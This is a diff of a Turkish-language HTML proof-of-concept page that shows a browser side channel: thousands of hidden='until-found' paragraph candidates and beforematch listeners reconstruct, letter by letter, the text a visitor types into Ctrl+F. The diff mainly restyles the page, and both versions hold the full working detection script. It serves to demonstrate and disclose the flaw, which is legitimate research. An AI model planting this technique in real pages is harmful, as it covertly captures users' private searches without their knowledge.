@@ -1,89 +1,33 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="tr">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ctrl+F until-found Side-Channel PoC</title>
+<meta name="viewport" content="width=device-width">
+<title>PoC: Sayfa İçi Arama (Ctrl+F) Veri Sızıntısı</title>
 
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
 
 <style>
-  body { background:#f8f9fa; color:#212529; }
-  .card { border-radius:10px; }
-  .log {
-    background:#fff;
-    font-family: monospace;
-    font-size:14px;
-    padding:12px;
-    border-radius:8px;
-    min-height:90px;
-    border:1px solid #dee2e6;
-  }
-  code { color:#0d6efd; }
+  .textcenter { text-align: center }
+  .textblue { color: #4169e1 }
+  p { font-family: system-ui, -apple-system, BlinkMacSystemFont }
 </style>
-</head>
-<body>
-
-<div class="container my-5">
-
-  <div class="card shadow-sm mb-4">
-    <div class="card-body">
-      <h4>🔍 Ctrl+F Testi</h4>
-      <p class="mb-1">
-        <strong>Ctrl + F</strong> yap ve şunu yaz:
-      </p>
-      <h5 class="text-primary">beykozunsesi</h5>
-      <p class="text-muted mb-0">
-        input yok · keydown yok · izin yok
-      </p>
-    </div>
-  </div>
-
-  <div class="card shadow-sm mb-4">
-    <div class="card-body">
-      <h6>📡 Algılanan Arama Dizisi</h6>
-      <div id="result" class="log text-success">
-        Bekleniyor...
-      </div>
-    </div>
-  </div>
-
-  <div class="card shadow-sm">
-    <div class="card-body">
-      <h5>🧠 Burada Ne Oluyor?</h5>
-      <p>
-        Bu PoC, <code>hidden="until-found"</code> özelliğinin
-        Ctrl+F sırasında bir yan kanal oluşturduğunu gösterir.
-      </p>
-      <ul>
-        <li>Gizli elementler Ctrl+F tarafından indekslenir</li>
-        <li>Eşleşince görünür olur</li>
-        <li><code>beforematch</code> olayı tetiklenir</li>
-        <li>JavaScript aramayı çözer</li>
-      </ul>
-    </div>
-  </div>
-
-</div>
-
-<!-- ⚠️ KRİTİK: layout içinde, render ediliyor ama görünmüyor -->
-<div id="search-candidates"
-     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
-</div>
 
 <script>
 let detectedSequence = "";
 const detected = new Set();
 let container;
 
-function cleanupOldCandidates(len) {
-  container.querySelectorAll('p[id^="c_"]').forEach(el => {
-    const l = el.getAttribute("data-sequence").length;
-    if (l !== 1 && (l < len || l > len + 1)) el.remove();
+function cleanupOldCandidates(n) {
+  container && container.querySelectorAll('p[id^="c_"]').forEach(e => {
+    const len = e.getAttribute("data-sequence").length;
+    if (len !== 1 && (len < n || n + 1 < len)) e.remove();
   });
 }
 
 function generateCandidates(prefix = "") {
+  if (!container) return;
+
   const charset =
     "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
 
@@ -97,16 +41,12 @@ function generateCandidates(prefix = "") {
 
     const p = document.createElement("p");
 
-    /* 🔴 ASIL FIX BURADA */
+    /* 🔴 KRİTİK: attribute olarak */
     p.setAttribute("hidden", "until-found");
 
     p.id = id;
     p.setAttribute("data-sequence", seq);
-
-    /* ZERO WIDTH SPACE */
-    p.textContent = seq.endsWith(" ")
-      ? seq + "\u200B"
-      : seq;
+    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;
 
     p.style.fontSize = "1px";
     p.style.margin = "0";
@@ -118,13 +58,10 @@ function generateCandidates(prefix = "") {
 
       if (current.length === 1) {
         detectedSequence = current;
-        result.textContent = current;
+        document.getElementById("result").textContent = current;
         detected.add(id);
         generateCandidates(current);
-        return;
-      }
-
-      if (!detected.has(id) && current.length > detectedSequence.length) {
+      } else if (!detected.has(id) && current.length > detectedSequence.length) {
         detected.add(id);
 
         const prevId = "c_" + encodeURIComponent(detectedSequence);
@@ -135,7 +72,7 @@ function generateCandidates(prefix = "") {
         }
 
         detectedSequence = current;
-        result.textContent = current;
+        document.getElementById("result").textContent = current;
         generateCandidates(current);
       }
     });
@@ -149,6 +86,63 @@ window.addEventListener("load", () => {
   generateCandidates();
 });
 </script>
+</head>
+
+<body class="bg-gray-50">
+
+<!-- ⚠️ ÖNEMLİ: layout içinde, gizli ama render ediliyor -->
+<div id="search-candidates"
+     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
+</div>
+
+<br>
+
+<h1 class="text-3xl font-bold textcenter">
+  Ctrl+F (Sayfada Bul) Veri Sızıntısı – PoC
+</h1>
+
+<br>
+
+<div class="py-6">
+  <div class="mx-auto max-w-screen-md px-4">
+
+    <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
+      <div class="flex items-center gap-4">
+        <span class="text-xl text-gray-700 font-medium">
+          Algılanan Arama:
+        </span>
+        <span id="result"
+              class="text-4xl font-bold text-blue-600 font-mono"></span>
+      </div>
+
+      <p class="text-lg mt-4">
+        Tarayıcıda <strong>Ctrl + F</strong> yapın ve deneme olarak
+        <strong>beykozunsesi</strong> yazın.
+      </p>
+
+      <p class="text-sm text-gray-500 mt-2">
+        Not: Bu sayfada input, form veya klavye dinleyicisi yoktur.
+      </p>
+    </div>
+
+    <h2 class="textblue text-xl font-semibold mb-2">Bu sayfada ne oluyor?</h2>
+    <p class="text-gray-700">
+      Bu PoC, Chromium tabanlı tarayıcılarda bulunan
+      <code>hidden="until-found"</code> özelliğinin,
+      sayfa içi arama (Ctrl+F) sırasında bir
+      <strong>side-channel (yan kanal) veri sızıntısına</strong>
+      nasıl dönüştüğünü gösterir.
+    </p>
+
+    <p class="text-gray-700 mt-2">
+      Kullanıcı sadece sayfada arama yaptığını sanır; ancak tarayıcı,
+      eşleşen gizli elementleri görünür hale getirir.
+      Bu an <code>beforematch</code> olayı ile JavaScript tarafından
+      algılanabilir ve aranan kelime <strong>harf harf</strong> çözülebilir.
+    </p>
+
+  </div>
+</div>
 
 </body>
 </html>
